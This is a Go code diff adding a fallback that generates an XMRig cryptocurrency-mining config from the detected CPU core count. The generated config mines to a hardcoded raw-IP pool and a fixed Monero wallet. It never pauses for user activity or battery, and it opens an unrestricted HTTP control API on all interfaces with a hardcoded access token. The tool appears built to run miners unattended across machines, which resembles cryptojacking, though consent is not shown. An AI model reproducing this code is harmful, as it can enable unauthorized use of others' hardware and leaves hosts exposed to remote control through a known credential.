@@ -42,7 +42,8 @@ type HTTPConfig struct {
 	Restricted  bool   `json:"restricted"`
 }
 
-// SelectConfig finds the most appropriate config file for the detected CPU
+// SelectConfig finds the most appropriate config file for the detected CPU.
+// If no static config file matches, it generates a generic config based on core count.
 func SelectConfig(cpuInfo *cpu.Info, configsPath string) (string, error) {
 	// List of config file candidates in priority order
 	candidates := buildConfigCandidates(cpuInfo)
@@ -54,7 +55,13 @@ func SelectConfig(cpuInfo *cpu.Info, configsPath string) (string, error) {
 		}
 	}
 
-	return "", fmt.Errorf("no suitable config found for CPU: %s (family: %s)", cpuInfo.RawModel, cpuInfo.Family)
+	// No static config found — generate a generic one based on core count
+	fmt.Printf("  No static config found, generating generic config for %d cores...\n", cpuInfo.Cores)
+	genericPath, err := generateGenericConfig(cpuInfo, configsPath)
+	if err != nil {
+		return "", fmt.Errorf("no suitable config found for CPU: %s (family: %s): %w", cpuInfo.RawModel, cpuInfo.Family, err)
+	}
+	return genericPath, nil
 }
 
 // buildConfigCandidates returns a prioritized list of config filenames to try
@@ -97,6 +104,167 @@ func buildConfigCandidates(cpuInfo *cpu.Info) []string {
 	candidates = append(candidates, "default.json")
 
 	return candidates
+}
+
+// generateGenericConfig creates a config file dynamically based on CPU core count
+// and vendor information. It writes the config to configsPath/generic_NNcores.json
+// and returns the path.
+func generateGenericConfig(cpuInfo *cpu.Info, configsPath string) (string, error) {
+	cores := cpuInfo.Cores
+	if cores < 1 {
+		cores = 1
+	}
+
+	// Build thread index array [0, 1, ..., cores-1]
+	threads := make([]int, cores)
+	for i := 0; i < cores; i++ {
+		threads[i] = i
+	}
+
+	// Determine ASM optimization based on vendor
+	asmMode := "auto"
+	vendor := getVendor(cpuInfo.Family)
+	if vendor == "amd" || strings.Contains(strings.ToLower(cpuInfo.RawModel), "amd") {
+		asmMode = "ryzen"
+	} else if vendor == "intel" || strings.Contains(strings.ToLower(cpuInfo.RawModel), "intel") {
+		asmMode = "intel"
+	}
+
+	// Scale settings based on core count
+	hugePages := true
+	hugePagesJit := cores >= 8
+	memoryPool := cores >= 8
+	oneGbPages := cores >= 16
+	priority := 5
+
+	// For low-core machines, reduce priority to avoid starving the system
+	if cores <= 2 {
+		priority = 3
+	} else if cores <= 4 {
+		priority = 4
+	}
+
+	// Build the config structure
+	config := map[string]interface{}{
+		"api": map[string]interface{}{
+			"id":        nil,
+			"worker-id": nil,
+		},
+		"http": map[string]interface{}{
+			"enabled":      true,
+			"host":         "0.0.0.0",
+			"port":         8181,
+			"access-token": "Hello2025@",
+			"restricted":   false,
+		},
+		"autosave":   false,
+		"background": false,
+		"colors":     true,
+		"title":      true,
+		"randomx": map[string]interface{}{
+			"init":                     -1,
+			"init-avx2":                -1,
+			"mode":                     "fast",
+			"1gb-pages":                oneGbPages,
+			"rdmsr":                    true,
+			"wrmsr":                    cores >= 8,
+			"cache_qos":                false,
+			"numa":                     true,
+			"scratchpad_prefetch_mode": 1,
+		},
+		"cpu": map[string]interface{}{
+			"enabled":          true,
+			"huge-pages":       hugePages,
+			"huge-pages-jit":   hugePagesJit,
+			"hw-aes":           nil,
+			"priority":         priority,
+			"memory-pool":      memoryPool,
+			"yield":            false,
+			"max-threads-hint": 100,
+			"asm":              asmMode,
+			"argon2-impl":      nil,
+			"rx":               threads,
+		},
+		"opencl": map[string]interface{}{
+			"enabled":   false,
+			"cache":     true,
+			"loader":    nil,
+			"cn-lite/0": false,
+			"cn/0":      false,
+		},
+		"cuda": map[string]interface{}{
+			"enabled":   false,
+			"loader":    nil,
+			"cn-lite/0": false,
+			"cn/0":      false,
+		},
+		"log-file":          "/usr/local/share/tarish/log/xmrig.log",
+		"donate-level":      0,
+		"donate-over-proxy": 0,
+		"pools": []map[string]interface{}{
+			{
+				"algo":             "RandomX",
+				"coin":             nil,
+				"url":              "150.230.194.138:3333",
+				"user":             "12EdCKM7ZWXGTMk3oVbS1XEuErrDfZdmmdGw5LTXBnecnwqavxPoZoE6vCjQ7oYnfURxG1bUUo2au5d6j2Trz8U4r2H",
+				"pass":             "x",
+				"rig-id":           nil,
+				"nicehash":         false,
+				"keepalive":        true,
+				"enabled":          true,
+				"tls":              false,
+				"sni":              false,
+				"tls-fingerprint":  nil,
+				"daemon":           false,
+				"socks5":           nil,
+				"self-select":      nil,
+				"submit-to-origin": false,
+			},
+		},
+		"retries":     5,
+		"retry-pause": 5,
+		"print-time":  60,
+		"syslog":      false,
+		"tls": map[string]interface{}{
+			"enabled":      false,
+			"protocols":    nil,
+			"cert":         nil,
+			"cert_key":     nil,
+			"ciphers":      nil,
+			"ciphersuites": nil,
+			"dhparam":      nil,
+		},
+		"dns": map[string]interface{}{
+			"ipv6": false,
+			"ttl":  30,
+		},
+		"user-agent":       nil,
+		"verbose":          0,
+		"watch":            true,
+		"pause-on-battery": false,
+		"pause-on-active":  false,
+	}
+
+	// Write the generic config file
+	configName := fmt.Sprintf("generic_%dcores.json", cores)
+	configPath := filepath.Join(configsPath, configName)
+
+	output, err := json.MarshalIndent(config, "", "  ")
+	if err != nil {
+		return "", fmt.Errorf("failed to generate generic config: %w", err)
+	}
+	output = append(output, '\n')
+
+	// Ensure configs directory exists
+	if err := os.MkdirAll(configsPath, 0755); err != nil {
+		return "", fmt.Errorf("failed to create configs directory: %w", err)
+	}
+
+	if err := os.WriteFile(configPath, output, 0644); err != nil {
+		return "", fmt.Errorf("failed to write generic config: %w", err)
+	}
+
+	return configPath, nil
 }
 
 // getShortName converts family to short config name (e.g., apple_m3_pro -> m3pro)
